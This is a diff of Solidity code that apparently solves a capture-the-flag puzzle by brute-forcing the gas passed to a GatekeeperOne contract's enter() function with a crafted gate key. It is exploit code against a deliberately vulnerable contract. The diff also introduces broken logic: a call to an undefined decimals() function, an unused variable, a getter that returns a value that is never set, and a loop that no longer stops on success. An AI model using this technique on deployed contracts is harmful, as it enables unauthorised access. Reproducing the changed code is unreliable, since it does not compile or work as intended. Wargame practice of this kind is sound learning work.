@@ -4,11 +4,11 @@ pragma solidity ^0.8.0;
 import "./Privacy.sol";
 
 contract GasGuzzler {
-    uint public gasCounter;
+    uint256 public gasCounter;
 
     function gasUsed() public returns (uint){
-        gasCounter = gasleft();
-        return gasleft();
+        uint256 a = 1000000 * (10**uint256(decimals()));
+        return gasCounter;
     }
 
     function txOrigin() public view returns (address){
@@ -23,18 +23,18 @@ contract GasGuzzler {
 
 contract GateEnterer {
 
+event Failed(bytes reason, uint gas);
+
+
  function callTwoGateEnterer(address _addr, bytes8 _gateKey) public { 
      GatekeeperOne gatekeeperOne = GatekeeperOne(_addr);
-     uint startIndex = 150;
-     uint endIndex = 270;
 
-     for (uint i = startIndex; i < endIndex; i++) {
-         (bool result) = 
-         gatekeeperOne.enter{gas: i + 8191 * 3}(_gateKey); 
-     if (result) {
-         break;
-     }
+     for (uint i = 150; i < 270; i++) {
+         try gatekeeperOne.enter{gas: i + 8191 * 3}(_gateKey) {}
+         catch (bytes memory reason) {
+             emit Failed(reason, i + 8191 * 3);
+            }
+        }
+
     }
- }
-
 }
